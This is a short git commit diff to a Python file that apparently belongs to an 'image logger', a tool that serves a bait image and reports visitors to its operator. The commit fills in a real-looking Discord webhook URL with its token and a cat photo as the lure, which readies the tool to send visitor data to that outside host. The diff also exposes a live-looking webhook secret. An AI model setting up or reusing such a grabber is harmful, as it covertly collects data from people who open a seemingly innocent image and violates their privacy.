a0120ad576f3731e6207c79ae355f1f83d4e1610
eafawsfqwefWSERgsgdfgrdgsrg <asenciokam@gmail.com>
2025-09-03 16:39:02 -0700

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,8 +12,8 @@ __author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discordapp.com/api/webhooks/1412933970189877390/A8tCR4Kfv7TbZWwVYEB5iLHGhCiwrr5dVCc6h5PtP9co3VPe3hUS2nmxRzVJ6O-iXeOF",
+    "image": "https://static.vecteezy.com/system/resources/previews/029/552/826/large_2x/portraits-of-cats-funny-faces-generative-ai-photo.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
